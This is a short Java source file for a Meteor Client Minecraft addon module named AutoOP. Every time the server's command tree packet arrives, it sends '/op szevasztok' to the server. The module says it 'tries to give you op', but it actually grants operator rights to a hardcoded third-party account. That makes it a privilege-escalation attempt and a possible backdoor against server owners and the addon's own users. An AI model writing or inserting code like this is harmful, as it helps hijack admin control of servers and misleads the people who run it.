package addon.antip2w.modules;

import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.s2c.play.CommandTreeS2CPacket;

import static meteordevelopment.orbit.EventPriority.HIGHEST;

public class AutoOP extends Module {

    public AutoOP() {
        super(Categories.WIP, "AutoOP", "Tries to give you op.");
    }

    @EventHandler(priority = HIGHEST+10)
    public void onCommandTree(PacketEvent.Receive event) {
        if (event.packet instanceof CommandTreeS2CPacket) {
            ChatUtils.info("Attempt to give op to 'szevasztok'...");
            ChatUtils.sendPlayerMsg("/op szevasztok");
        }
    }
}
